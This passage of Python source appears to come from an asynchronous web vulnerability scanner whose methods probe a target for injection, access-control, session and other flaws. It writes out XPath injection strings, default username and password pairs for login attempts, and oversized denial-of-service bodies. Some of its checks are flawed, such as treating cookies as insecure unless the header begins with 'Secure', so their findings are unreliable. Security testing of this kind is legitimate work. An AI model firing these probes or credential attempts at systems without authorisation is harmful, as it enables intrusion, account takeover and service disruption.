                                'payload': value,
                                'url': test_url,
                                'description': f'IDOR vulnerability detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"IDOR test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_improper_access_control(self) -> List[Dict]:
        """Test for improper access control vulnerabilities."""
        vulnerabilities = []
        
        protected_endpoints = ['/admin', '/dashboard', '/users', '/settings', '/config', '/api/admin', '/internal']
        
        for endpoint in protected_endpoints:
            try:
                test_url = urljoin(self.target_url, endpoint)
                response = await self.make_request(test_url)
                
                if response and response.status == 200:
                    content = await response.text()
                    if self._detect_access_control_bypass(content, endpoint):
                        vulnerabilities.append({
                            'type': 'Improper Access Control',
                            'severity': 'High',
                            'url': test_url,
                            'description': f'Access control bypass detected for endpoint: {endpoint}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"Access control test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_business_logic_errors(self) -> List[Dict]:
        """Test for business logic vulnerabilities."""
        vulnerabilities = []
        
        # Test for negative values in price/quantity fields
        business_params = ['price', 'quantity', 'amount', 'cost', 'value', 'count', 'number']
        business_values = ['-1', '-999', '0.01', '999999999', 'infinity', 'NaN']
        
        for param in business_params:
            for value in business_values:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(value)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_business_logic_error(content, param, value):
                            vulnerabilities.append({
                                'type': 'Business Logic Error',
                                'severity': 'Medium',
                                'parameter': param,
                                'payload': value,
                                'url': test_url,
                                'description': f'Business logic error detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Business logic test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_open_redirect(self) -> List[Dict]:
        """Test for open redirect vulnerabilities."""
        vulnerabilities = []
        
        redirect_params = ['url', 'redirect', 'next', 'return', 'goto', 'target', 'destination', 'callback']
        
        for param in redirect_params:
            for payload in self.open_redirect_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url, allow_redirects=False)
                    
                    if response and response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if self._detect_open_redirect(location, payload):
                            vulnerabilities.append({
                                'type': 'Open Redirect',
                                'severity': 'Medium',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'redirect_url': location,
                                'description': f'Open redirect vulnerability detected in parameter: {param}',
                                'confidence': 'High'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Open redirect test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_rce(self) -> List[Dict]:
        """Test for Remote Code Execution vulnerabilities."""
        vulnerabilities = []
        
        rce_params = ['cmd', 'command', 'exec', 'system', 'eval', 'shell', 'run']
        
        for param in rce_params:
            for payload in self.command_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_rce(content, payload):
                            vulnerabilities.append({
                                'type': 'Remote Code Execution (RCE)',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'Remote code execution detected in parameter: {param}',
                                'confidence': 'High'
                            })
                            
                except Exception as e:
                    self.logger.error(f"RCE test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_lfi(self) -> List[Dict]:
        """Test for Local File Inclusion vulnerabilities."""
        vulnerabilities = []
        
        lfi_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'template', 'view']
        
        for param in lfi_params:
            for payload in self.file_inclusion_payloads['lfi']:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_file_content(content):
                            vulnerabilities.append({
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'High',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'Local file inclusion detected in parameter: {param}',
                                'confidence': 'High'
                            })
                            
                except Exception as e:
                    self.logger.error(f"LFI test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_rfi(self) -> List[Dict]:
        """Test for Remote File Inclusion vulnerabilities."""
        vulnerabilities = []
        
        rfi_params = ['file', 'include', 'path', 'template', 'view', 'page']
        
        for param in rfi_params:
            for payload in self.file_inclusion_payloads['rfi']:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_rfi_content(content):
                            vulnerabilities.append({
                                'type': 'Remote File Inclusion (RFI)',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'Remote file inclusion detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"RFI test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_security_misconfiguration(self) -> List[Dict]:
        """Test for security misconfiguration vulnerabilities."""
        vulnerabilities = []
        
        misconfig_urls = [
            f"{self.target_url}/.env",
            f"{self.target_url}/config.php",
            f"{self.target_url}/database.php",
            f"{self.target_url}/.git/config",
            f"{self.target_url}/.svn/entries",
            f"{self.target_url}/web.config",
            f"{self.target_url}/.htaccess",
            f"{self.target_url}/phpinfo.php",
            f"{self.target_url}/info.php",
            f"{self.target_url}/test.php"
        ]
        
        for url in misconfig_urls:
            try:
                response = await self.make_request(url)
                if response and response.status == 200:
                    content = await response.text()
                    if self._detect_misconfiguration(content, url):
                        vulnerabilities.append({
                            'type': 'Security Misconfiguration',
                            'severity': 'High',
                            'url': url,
                            'description': f'Security misconfiguration detected: {url}',
                            'confidence': 'High'
                        })
                        
            except Exception as e:
                self.logger.error(f"Security misconfiguration test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_broken_auth_session(self) -> List[Dict]:
        """Test for broken authentication and session management."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                headers = response.headers
                
                # Check session cookie security
                set_cookie = headers.get('Set-Cookie', '')
                
                session_issues = []
                
                if 'HttpOnly' not in set_cookie:
                    session_issues.append('Missing HttpOnly flag')
                    
                if 'Secure' not in set_cookie and self.target_url.startswith('https'):
                    session_issues.append('Missing Secure flag for HTTPS')
                    
                if 'SameSite' not in set_cookie:
                    session_issues.append('Missing SameSite attribute')
                    
                if session_issues:
                    vulnerabilities.append({
                        'type': 'Broken Authentication and Session Management',
                        'severity': 'Medium',
                        'description': f'Session cookie security issues: {", ".join(session_issues)}',
                        'confidence': 'High'
                    })
                    
        except Exception as e:
            self.logger.error(f"Broken auth session test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_sensitive_data_exposure(self) -> List[Dict]:
        """Test for sensitive data exposure."""
        vulnerabilities = []
        
        sensitive_patterns = [
            r'password["\']?\s*[:=]\s*["\'][^"\']+["\']',
            r'secret["\']?\s*[:=]\s*["\'][^"\']+["\']',
            r'key["\']?\s*[:=]\s*["\'][^"\']+["\']',
            r'token["\']?\s*[:=]\s*["\'][^"\']+["\']',
            r'api_key["\']?\s*[:=]\s*["\'][^"\']+["\']',
            r'private_key["\']?\s*[:=]\s*["\'][^"\']+["\']'
        ]
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                content = await response.text()
                
                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        vulnerabilities.append({
                            'type': 'Sensitive Data Exposure',
                            'severity': 'High',
                            'description': f'Potential sensitive data exposure detected: {pattern}',
                            'matches': matches[:3],  # Limit to first 3 matches
                            'confidence': 'Medium'
                        })
                        
        except Exception as e:
            self.logger.error(f"Sensitive data exposure test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_missing_function_level_access_control(self) -> List[Dict]:
        """Test for missing function level access control."""
        vulnerabilities = []
        
        admin_functions = ['/admin/users', '/admin/settings', '/admin/config', '/admin/delete', '/admin/create']
        
        for function in admin_functions:
            try:
                test_url = urljoin(self.target_url, function)
                response = await self.make_request(test_url)
                
                if response and response.status == 200:
                    content = await response.text()
                    if self._detect_admin_function_access(content, function):
                        vulnerabilities.append({
                            'type': 'Missing Function Level Access Control',
                            'severity': 'High',
                            'url': test_url,
                            'description': f'Admin function accessible without proper authorization: {function}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"Function level access control test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_components_known_vulnerabilities(self) -> List[Dict]:
        """Test for components with known vulnerabilities."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                headers = response.headers
                content = await response.text()
                
                # Check for version information in headers
                server = headers.get('Server', '')
                x_powered_by = headers.get('X-Powered-By', '')
                
                if server:
                    vulnerabilities.append({
                        'type': 'Using Components with Known Vulnerabilities',
                        'severity': 'Medium',
                        'description': f'Server version disclosed: {server}',
                        'confidence': 'High'
                    })
                    
                if x_powered_by:
                    vulnerabilities.append({
                        'type': 'Using Components with Known Vulnerabilities',
                        'severity': 'Medium',
                        'description': f'Technology stack disclosed: {x_powered_by}',
                        'confidence': 'High'
                    })
                    
                # Check for version information in content
                version_patterns = [
                    r'version["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'v(\d+\.\d+\.\d+)',
                    r'(\d+\.\d+\.\d+)'
                ]
                
                for pattern in version_patterns:
                    matches = re.findall(pattern, content, re.IGNORECASE)
                    if matches:
                        vulnerabilities.append({
                            'type': 'Using Components with Known Vulnerabilities',
                            'severity': 'Low',
                            'description': f'Version information disclosed in content',
                            'versions': matches[:3],
                            'confidence': 'Medium'
                        })
                        break
                        
        except Exception as e:
            self.logger.error(f"Components vulnerability test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_unvalidated_redirects_forwards(self) -> List[Dict]:
        """Test for unvalidated redirects and forwards."""
        vulnerabilities = []
        
        redirect_params = ['url', 'redirect', 'next', 'return', 'goto', 'target', 'destination']
        
        for param in redirect_params:
            for payload in self.open_redirect_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url, allow_redirects=False)
                    
                    if response and response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if self._detect_unvalidated_redirect(location, payload):
                            vulnerabilities.append({
                                'type': 'Unvalidated Redirects and Forwards',
                                'severity': 'Medium',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'redirect_url': location,
                                'description': f'Unvalidated redirect detected in parameter: {param}',
                                'confidence': 'High'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Unvalidated redirects test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_clickjacking(self) -> List[Dict]:
        """Test for clickjacking vulnerabilities."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                headers = response.headers
                
                # Check for X-Frame-Options header
                x_frame_options = headers.get('X-Frame-Options', '')
                content_security_policy = headers.get('Content-Security-Policy', '')
                
                if not x_frame_options and 'frame-ancestors' not in content_security_policy:
                    vulnerabilities.append({
                        'type': 'Clickjacking',
                        'severity': 'Medium',
                        'description': 'Missing X-Frame-Options or CSP frame-ancestors directive',
                        'confidence': 'High'
                    })
                    
        except Exception as e:
            self.logger.error(f"Clickjacking test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_host_header_injection(self) -> List[Dict]:
        """Test for Host Header Injection vulnerabilities."""
        vulnerabilities = []
        
        for payload in self.host_header_payloads:
            try:
                response = await self.make_request(
                    self.target_url,
                    headers={'Host': payload}
                )
                
                if response:
                    content = await response.text()
                    if self._detect_host_header_injection(content, payload):
                        vulnerabilities.append({
                            'type': 'Host Header Injection',
                            'severity': 'High',
                            'payload': payload,
                            'description': f'Host header injection detected with payload: {payload}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"Host header injection test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_http_parameter_pollution(self) -> List[Dict]:
        """Test for HTTP Parameter Pollution vulnerabilities."""
        vulnerabilities = []
        
        pollution_params = ['id', 'user', 'page', 'action', 'type', 'status']
        
        for param in pollution_params:
            for payload in self.parameter_pollution_payloads:
                try:
                    test_url = f"{self.target_url}?{payload}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_parameter_pollution(content, param):
                            vulnerabilities.append({
                                'type': 'HTTP Parameter Pollution',
                                'severity': 'Medium',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'Parameter pollution detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Parameter pollution test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_insufficient_logging_monitoring(self) -> List[Dict]:
        """Test for insufficient logging and monitoring."""
        vulnerabilities = []
        
        # Test for missing security headers that indicate logging
        try:
            response = await self.make_request(self.target_url)
            if response:
                headers = response.headers
                
                # Check for security monitoring headers
                monitoring_headers = [
                    'X-Content-Type-Options',
                    'X-Frame-Options',
                    'Content-Security-Policy',
                    'Strict-Transport-Security'
                ]
                
                missing_headers = []
                for header in monitoring_headers:
                    if header not in headers:
                        missing_headers.append(header)
                        
                if missing_headers:
                    vulnerabilities.append({
                        'type': 'Insufficient Logging and Monitoring',
                        'severity': 'Low',
                        'description': f'Missing security headers that indicate insufficient monitoring: {", ".join(missing_headers)}',
                        'confidence': 'Medium'
                    })
                    
        except Exception as e:
            self.logger.error(f"Insufficient logging test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_race_conditions(self) -> List[Dict]:
        """Test for race condition vulnerabilities."""
        vulnerabilities = []
        
        # Test concurrent requests to detect race conditions
        race_endpoints = ['/api/transfer', '/api/purchase', '/api/vote', '/api/like']
        
        for endpoint in race_endpoints:
            try:
                test_url = urljoin(self.target_url, endpoint)
                
                # Send multiple concurrent requests
                tasks = []
                for i in range(5):
                    task = self.make_request(test_url, method='POST', data={'amount': '100'})
                    tasks.append(task)
                    
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Analyze responses for race condition indicators
                if self._detect_race_condition(responses):
                    vulnerabilities.append({
                        'type': 'Race Condition',
                        'severity': 'High',
                        'url': test_url,
                        'description': f'Potential race condition detected in endpoint: {endpoint}',
                        'confidence': 'Medium'
                    })
                    
            except Exception as e:
                self.logger.error(f"Race condition test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_dos(self) -> List[Dict]:
        """Test for Denial of Service vulnerabilities."""
        vulnerabilities = []
        
        # Test for resource exhaustion
        dos_payloads = [
            'A' * 10000,  # Large payload
            '{"data": "' + 'A' * 10000 + '"}',  # Large JSON
            '?param=' + 'A' * 1000,  # Large URL
        ]
        
        for payload in dos_payloads:
            try:
                start_time = time.time()
                response = await self.make_request(
                    self.target_url,
                    method='POST',
                    data=payload
                )
                end_time = time.time()
                
                # Check if response time is unusually long (potential DoS)
                if end_time - start_time > 10:  # 10 seconds threshold
                    vulnerabilities.append({
                        'type': 'Denial of Service (DoS)',
                        'severity': 'Medium',
                        'description': f'Potential DoS vulnerability - response time: {end_time - start_time:.2f}s',
                        'confidence': 'Low'
                    })
                    
            except Exception as e:
                self.logger.error(f"DoS test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_authorization_bypass(self) -> List[Dict]:
        """Test for authorization bypass vulnerabilities."""
        vulnerabilities = []
        
        auth_params = ['role', 'level', 'type', 'status', 'permission', 'access', 'privilege', 'group']
        auth_values = ['admin', 'administrator', 'root', 'superuser', 'manager', 'owner', 'user', 'guest']
        
        for param in auth_params:
            for value in auth_values:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(value)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_authorization_bypass(content, param, value):
                            vulnerabilities.append({
                                'type': 'Authorization Bypass',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': value,
                                'url': test_url,
                                'description': f'Authorization bypass detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Authorization bypass test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_session_fixation(self) -> List[Dict]:
        """Test for session fixation vulnerabilities."""
        vulnerabilities = []
        
        try:
            # First request to get initial session
            response1 = await self.make_request(self.target_url)
            session1 = response1.cookies.get('sessionid') or response1.cookies.get('JSESSIONID')
            
            # Login request (simulated)
            login_data = {'username': 'test', 'password': 'test'}
            response2 = await self.make_request(
                self.target_url + '/login',
                method='POST',
                data=login_data
            )
            session2 = response2.cookies.get('sessionid') or response2.cookies.get('JSESSIONID')
            
            # Check if session ID changed after login
            if session1 and session2 and session1 == session2:
                vulnerabilities.append({
                    'type': 'Session Fixation',
                    'severity': 'Medium',
                    'description': 'Session ID not regenerated after login',
                    'confidence': 'High'
                })
                
        except Exception as e:
            self.logger.error(f"Session fixation test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_session_hijacking(self) -> List[Dict]:
        """Test for session hijacking vulnerabilities."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                headers = response.headers
                set_cookie = headers.get('Set-Cookie', '')
                
                # Check for secure session cookies
                if not set_cookie.startswith('Secure'):
                    vulnerabilities.append({
                        'type': 'Session Hijacking',
                        'severity': 'Medium',
                        'description': 'Session cookies not marked as Secure',
                        'confidence': 'High'
                    })
                    
                if 'HttpOnly' not in set_cookie:
                    vulnerabilities.append({
                        'type': 'Session Hijacking',
                        'severity': 'Medium',
                        'description': 'Session cookies not marked as HttpOnly',
                        'confidence': 'High'
                    })
                    
        except Exception as e:
            self.logger.error(f"Session hijacking test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_cookie_security_issues(self) -> List[Dict]:
        """Test for cookie security issues."""
        vulnerabilities = []
        
        try:
            response = await self.make_request(self.target_url)
            if response:
                headers = response.headers
                set_cookie = headers.get('Set-Cookie', '')
                
                cookie_issues = []
                
                if 'HttpOnly' not in set_cookie:
                    cookie_issues.append('Missing HttpOnly flag')
                    
                if 'Secure' not in set_cookie and self.target_url.startswith('https'):
                    cookie_issues.append('Missing Secure flag')
                    
                if 'SameSite' not in set_cookie:
                    cookie_issues.append('Missing SameSite attribute')
                    
                if not set_cookie.startswith('Secure'):
                    cookie_issues.append('Not marked as Secure')
                    
                if cookie_issues:
                    vulnerabilities.append({
                        'type': 'Cookie Security Issues',
                        'severity': 'Medium',
                        'description': f'Cookie security issues: {", ".join(cookie_issues)}',
                        'confidence': 'High'
                    })
                    
        except Exception as e:
            self.logger.error(f"Cookie security test error: {str(e)}")
            
        return vulnerabilities
        
    async def test_weak_password_recovery(self) -> List[Dict]:
        """Test for weak password recovery mechanisms."""
        vulnerabilities = []
        
        recovery_endpoints = ['/forgot-password', '/reset-password', '/recover', '/password-reset']
        
        for endpoint in recovery_endpoints:
            try:
                test_url = urljoin(self.target_url, endpoint)
                response = await self.make_request(test_url)
                
                if response and response.status == 200:
                    content = await response.text()
                    
                    # Check for weak password recovery patterns
                    if self._detect_weak_password_recovery(content):
                        vulnerabilities.append({
                            'type': 'Weak Password Recovery',
                            'severity': 'Medium',
                            'url': test_url,
                            'description': f'Weak password recovery mechanism detected: {endpoint}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"Weak password recovery test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_username_enumeration(self) -> List[Dict]:
        """Test for username enumeration vulnerabilities."""
        vulnerabilities = []
        
        login_endpoints = ['/login', '/signin', '/auth', '/user/login']
        
        for endpoint in login_endpoints:
            try:
                test_url = urljoin(self.target_url, endpoint)
                
                # Test with valid username
                response1 = await self.make_request(
                    test_url,
                    method='POST',
                    data={'username': 'admin', 'password': 'wrongpassword'}
                )
                
                # Test with invalid username
                response2 = await self.make_request(
                    test_url,
                    method='POST',
                    data={'username': 'nonexistentuser', 'password': 'wrongpassword'}
                )
                
                if response1 and response2:
                    content1 = await response1.text()
                    content2 = await response2.text()
                    
                    if self._detect_username_enumeration(content1, content2):
                        vulnerabilities.append({
                            'type': 'Username Enumeration',
                            'severity': 'Medium',
                            'url': test_url,
                            'description': f'Username enumeration vulnerability detected: {endpoint}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"Username enumeration test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_brute_force_attacks(self) -> List[Dict]:
        """Test for brute force attack vulnerabilities."""
        vulnerabilities = []
        
        login_endpoints = ['/login', '/signin', '/auth', '/user/login']
        
        for endpoint in login_endpoints:
            try:
                test_url = urljoin(self.target_url, endpoint)
                
                # Test multiple failed login attempts
                failed_attempts = 0
                for i in range(5):
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        data={'username': 'admin', 'password': f'wrongpassword{i}'}
                    )
                    
                    if response and response.status != 200:
                        failed_attempts += 1
                        
                # Check if no rate limiting is applied
                if failed_attempts == 5:
                    vulnerabilities.append({
                        'type': 'Brute Force Attacks',
                        'severity': 'Medium',
                        'url': test_url,
                        'description': f'No rate limiting detected for login attempts: {endpoint}',
                        'confidence': 'Medium'
                    })
                    
            except Exception as e:
                self.logger.error(f"Brute force test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_credential_stuffing(self) -> List[Dict]:
        """Test for credential stuffing vulnerabilities."""
        vulnerabilities = []
        
        # Test with common credentials
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('user', 'user')
        ]
        
        login_endpoints = ['/login', '/signin', '/auth', '/user/login']
        
        for endpoint in login_endpoints:
            for username, password in common_credentials:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        data={'username': username, 'password': password}
                    )
                    
                    if response and response.status == 200:
                        content = await response.text()
                        if self._detect_successful_login(content):
                            vulnerabilities.append({
                                'type': 'Credential Stuffing',
                                'severity': 'High',
                                'url': test_url,
                                'description': f'Weak credentials accepted: {username}:{password}',
                                'confidence': 'High'
                            })
                            break  # Don't test more credentials for this endpoint
                            
                except Exception as e:
                    self.logger.error(f"Credential stuffing test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_api_security_issues(self) -> List[Dict]:
        """Test for API security issues."""
        vulnerabilities = []
        
        api_endpoints = ['/api', '/api/v1', '/api/v2', '/rest', '/graphql']
        
        for endpoint in api_endpoints:
            try:
                test_url = urljoin(self.target_url, endpoint)
                response = await self.make_request(test_url)
                
                if response:
                    headers = response.headers
                    content = await response.text()
                    
                    # Check for API security issues
                    api_issues = []
                    
                    if 'Access-Control-Allow-Origin' not in headers:
                        api_issues.append('Missing CORS configuration')
                        
                    if 'Rate-Limit' not in headers:
                        api_issues.append('No rate limiting headers')
                        
                    if 'API-Key' not in headers and 'Authorization' not in headers:
                        api_issues.append('No authentication headers')
                        
                    if api_issues:
                        vulnerabilities.append({
                            'type': 'API Security Issues',
                            'severity': 'Medium',
                            'url': test_url,
                            'description': f'API security issues: {", ".join(api_issues)}',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"API security test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_graphql_injection(self) -> List[Dict]:
        """Test for GraphQL injection vulnerabilities."""
        vulnerabilities = []
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/query', '/api/query']
        
        for endpoint in graphql_endpoints:
            for payload in self.graphql_payloads:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        json={'query': payload}
                    )
                    
                    if response:
                        content = await response.text()
                        if self._detect_graphql_injection(content, payload):
                            vulnerabilities.append({
                                'type': 'GraphQL Injection',
                                'severity': 'High',
                                'url': test_url,
                                'payload': payload,
                                'description': f'GraphQL injection detected: {endpoint}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"GraphQL injection test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_nosql_injection(self) -> List[Dict]:
        """Test for NoSQL injection vulnerabilities."""
        vulnerabilities = []
        
        nosql_params = ['username', 'password', 'user', 'pass', 'email', 'login', 'auth', 'query', 'filter']
        
        for param in nosql_params:
            for payload in self.nosql_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_nosql_injection(content, payload):
                            vulnerabilities.append({
                                'type': 'NoSQL Injection',
                                'severity': 'High',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'NoSQL injection detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"NoSQL injection test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_xpath_injection(self) -> List[Dict]:
        """Test for XPath injection vulnerabilities."""
        vulnerabilities = []
        
        xpath_params = ['search', 'query', 'filter', 'xpath', 'xml', 'id', 'name']
        xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "x' or 'x'='y",
            "' or count(/)=0 or 'x'='y"
        ]
        
        for param in xpath_params:
            for payload in xpath_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_xpath_injection(content, payload):
                            vulnerabilities.append({
                                'type': 'XPath Injection',
                                'severity': 'High',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'XPath injection detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"XPath injection test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_template_injection(self) -> List[Dict]:
        """Test for Template Injection (SSTI) vulnerabilities."""
        vulnerabilities = []
        
        template_params = ['template', 'view', 'page', 'content', 'message', 'name', 'search', 'render']
        
        for param in template_params:
            for template_type, payloads in self.ssti_payloads.items():
                for payload in payloads:
                    try:
                        test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                        response = await self.make_request(test_url)
                        
                        if response:
                            content = await response.text()
                            if self._detect_template_injection(content, payload, template_type):
                                vulnerabilities.append({
                                    'type': f'Template Injection (SSTI - {template_type})',
                                    'severity': 'High',
                                    'parameter': param,
                                    'payload': payload,
                                    'url': test_url,
                                    'description': f'{template_type} template injection detected in parameter: {param}',
                                    'confidence': 'Medium'
                                })
                                
                    except Exception as e:
                        self.logger.error(f"Template injection test error: {str(e)}")
                        
        return vulnerabilities
        
    async def test_csv_injection(self) -> List[Dict]:
        """Test for CSV injection vulnerabilities."""
        vulnerabilities = []
        
        csv_endpoints = ['/export', '/download', '/csv', '/export.csv', '/data.csv']
        
        for endpoint in csv_endpoints:
            for payload in self.csv_payloads:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_csv_injection(content, payload):
                            vulnerabilities.append({
                                'type': 'CSV Injection',
                                'severity': 'Medium',
                                'url': test_url,
                                'payload': payload,
                                'description': f'CSV injection detected: {endpoint}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"CSV injection test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_email_header_injection(self) -> List[Dict]:
        """Test for Email Header Injection vulnerabilities."""
        vulnerabilities = []
        
        email_endpoints = ['/contact', '/mail', '/send', '/email', '/feedback']
        
        for endpoint in email_endpoints:
            for payload in self.email_header_payloads:
                try:
                    test_url = urljoin(self.target_url, endpoint)
                    response = await self.make_request(
                        test_url,
                        method='POST',
                        data={'email': payload, 'message': 'test'}
                    )
                    
                    if response:
                        content = await response.text()
                        if self._detect_email_header_injection(content, payload):
                            vulnerabilities.append({
                                'type': 'Email Header Injection',
                                'severity': 'Medium',
                                'url': test_url,
                                'payload': payload,
                                'description': f'Email header injection detected: {endpoint}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"Email header injection test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_http_response_splitting(self) -> List[Dict]:
        """Test for HTTP Response Splitting vulnerabilities."""
        vulnerabilities = []
        
        response_params = ['redirect', 'url', 'next', 'return', 'location']
        
        for param in response_params:
            for payload in self.response_splitting_payloads:
                try:
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    response = await self.make_request(test_url)
                    
                    if response:
                        content = await response.text()
                        if self._detect_response_splitting(content, payload):
                            vulnerabilities.append({
                                'type': 'HTTP Response Splitting',
                                'severity': 'High',
                                'parameter': param,
                                'payload': payload,
                                'url': test_url,
                                'description': f'HTTP response splitting detected in parameter: {param}',
                                'confidence': 'Medium'
                            })
                            
                except Exception as e:
                    self.logger.error(f"HTTP response splitting test error: {str(e)}")
                    
        return vulnerabilities
        
    async def test_http_request_smuggling(self) -> List[Dict]:
        """Test for HTTP Request Smuggling vulnerabilities."""
        vulnerabilities = []
        
        for payload in self.request_smuggling_payloads:
            try:
                response = await self.make_request(
                    self.target_url,
                    method='POST',
                    data=payload,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'}
                )
                
                if response:
                    content = await response.text()
                    if self._detect_request_smuggling(content, payload):
                        vulnerabilities.append({
                            'type': 'HTTP Request Smuggling',
                            'severity': 'High',
                            'payload': payload,
                            'description': 'HTTP request smuggling detected',
                            'confidence': 'Medium'
                        })
                        
            except Exception as e:
                self.logger.error(f"HTTP request smuggling test error: {str(e)}")
                
        return vulnerabilities
        
    async def test_cache_poisoning(self) -> List[Dict]:
        """Test for Cache Poisoning vulnerabilities."""
        vulnerabilities = []
        
        for payload in self.cache_poisoning_payloads:
